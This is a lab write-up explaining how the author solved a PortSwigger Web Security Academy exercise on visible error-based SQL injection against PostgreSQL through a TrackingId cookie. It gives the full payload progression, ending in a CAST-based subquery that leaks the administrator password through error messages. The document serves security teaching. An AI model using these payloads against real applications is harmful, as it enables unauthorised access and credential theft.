PortSwigger Web Security Academy: Visible Error-Based SQL Injection

Practitioner PostgreSQL SQL Injection Error-Based SQLi

Lab Overview

Lab: Visible error-based SQL injection

Difficulty: Practitioner

Vulnerability: Error-based SQL Injection

Database: PostgreSQL

Objective: Extract the administrator's password from the users table and log in as the administrator.

Learning environment: This technique was performed against an intentionally vulnerable PortSwigger Web Security Academy lab.

1. Understanding the Vulnerability

The application uses a TrackingId cookie for analytics. The value of this cookie is incorporated into a SQL query.

The important observation was that the application returned verbose database error messages when the SQL query was malformed.

This created an opportunity to use the database's error messages as an information disclosure channel.

The database contained a users table with: 

username
password

The goal was to make the database return the contents of these columns inside an error message.

2. Confirming SQL Injection

The first step was to modify the TrackingId cookie by adding a single quote: 

TrackingId=Eh6LtTmmmvORpiE9'

This caused a SQL error indicating that our input was being inserted inside a quoted SQL string.

This confirmed that the TrackingId value was potentially injectable.

3. Closing the String and Commenting the Query

We then added a SQL comment: 

TrackingId=Eh6LtTmmmvORpiE9'--

The important payload component was: 

'--

The single quote closes the application's existing SQL string, while -- comments out the remainder of the SQL query.

The absence of the previous syntax error indicated that the resulting query was syntactically valid.

4. Testing a CAST-Based Error

The next step was to determine whether we could deliberately generate a database conversion error. 

TrackingId=Eh6LtTmmmvORpiE9' AND 1=CAST((SELECT 1) AS int)--

The important SQL expression was: 

AND 1=CAST((SELECT 1) AS int)

SELECT 1 returns the integer 1, so casting it to an integer succeeds.

The request returned the normal application response: 

HTTP/2 200 OK

This demonstrated that the injected SQL expression was being executed successfully.

5. Extracting the Username

We then replaced the test value with a query for the username: 

TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--

The LIMIT 1 was important because: 

SELECT username FROM users

could potentially return multiple rows. We needed the subquery to return a single value.

Database error: 
ERROR: invalid input syntax for type integer: "administrator"

This was the critical result.

PostgreSQL attempted to cast: 

administrator

to an integer: 

CAST('administrator' AS int)

Since administrator is not a valid integer, PostgreSQL generated an error containing the offending value.

Therefore, we successfully extracted the first username: 

administrator

6. Extracting the Administrator Password

Once we knew that the administrator was the first user returned by the query, we changed the selected column from username to password. 

TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--

The important SQL logic was: 

SELECT password FROM users LIMIT 1

PostgreSQL attempted to cast the returned password to an integer. Because the password was not an integer, the conversion failed and the database error exposed the offending value.

Result: The administrator's password was disclosed through the PostgreSQL conversion error.

7. Why the Attack Worked

The attack relied on three important conditions.

1. SQL Injection

The TrackingId cookie was incorporated into a SQL query without being safely parameterized.

2. Database Errors Were Exposed

Instead of returning a generic error to the user, the application exposed the underlying PostgreSQL error.

3. CAST Was Used to Force Data into the Error

We deliberately caused the database to perform: 

CAST(<database value> AS int)

When the value was a string such as: 

administrator

PostgreSQL reported the offending value in its error message.

This transformed a potentially blind SQL injection into a visible error-based SQL injection.

8. Payload Progression

Step 1 — Trigger an SQL Error

TrackingId=Eh6LtTmmmvORpiE9'

Purpose:

Confirm that the cookie value is inside a SQL string.

Step 2 — Close the String and Comment the Remainder

TrackingId=Eh6LtTmmmvORpiE9'--

Purpose:

Make the injected SQL syntactically valid.

Step 3 — Test the CAST Technique

TrackingId=Eh6LtTmmmvORpiE9' AND 1=CAST((SELECT 1) AS int)--

Purpose:

Confirm that a CAST-based SQL expression can be executed.

Step 4 — Extract the Username

TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--

Result:

ERROR: invalid input syntax for type integer: "administrator"

Step 5 — Extract the Password

TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--

Result:

ERROR: invalid input syntax for type integer: "<administrator-password>"

9. Authentication

After obtaining the password, we used the extracted credentials to authenticate as the administrator: 

Username: administrator
Password: <extracted password>

Logging in with these credentials completed the lab.

10. Key Lessons Learned

  • SQL injection can occur through HTTP cookies, not only URL parameters or form fields.
  • A verbose database error can become an information disclosure mechanism.
  • The single quote was used to escape the application's SQL string.
  • -- was used to comment out the remainder of the original SQL query.
  • SELECT subqueries can retrieve data from another table.
  • LIMIT 1 is useful when a scalar subquery must return only one row.
  • CAST() can deliberately trigger a database conversion error.
  • PostgreSQL's error message revealed the value that failed the conversion.
  • Error-based SQL injection can extract sensitive information even when query results are not normally displayed.

Conclusion

This lab demonstrated how seemingly harmless verbose database errors can completely undermine an application's security.

Although the application did not directly display the results of the SQL query, the database error messages provided an alternative channel for extracting sensitive information.

The core technique was to deliberately force a type-conversion failure using: 

CAST((SELECT <column> FROM users LIMIT 1) AS int)

By first extracting the username and then replacing username with password, we were able to retrieve the administrator credentials and successfully complete the lab.
